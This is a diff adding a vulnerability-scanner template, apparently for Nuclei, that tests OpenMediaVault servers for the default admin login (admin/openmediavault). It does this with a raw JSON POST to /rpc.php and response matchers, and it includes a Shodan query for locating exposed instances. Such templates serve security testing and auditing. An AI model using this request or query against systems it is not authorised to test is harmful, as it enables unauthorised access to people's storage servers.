@@ -1,0 +1,51 @@
+http:
+    - attack: pitchfork
+      cookie-reuse: true
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"authenticated":true'
+            - '"permissions":'
+        - part: header
+          type: word
+          words:
+            - application/json
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - openmediavault
+        username:
+            - admin
+      raw:
+        - |
+          POST /rpc.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/json
+
+          {"service":"Session","method":"login","params":{"username":"{{username}}","password":"{{password}}"},"options":null}
+id: openmediavault-default-login
+info:
+    author: DhiyaneshDK
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    metadata:
+        max-request: 1
+        shodan-query: title:"OpenMediaVault"
+        verified: true
+    name: OpenMediaVault - Default Login
+    reference:
+        - https://forum.openmediavault.org/index.php?thread/7784-default-login/
+        - https://soltveit.org/openmediavault-default-password/
+    severity: high
+    tags:
+        - default-login
+        - openmediavault
+        - authenticate
+        - OpenMediaVault
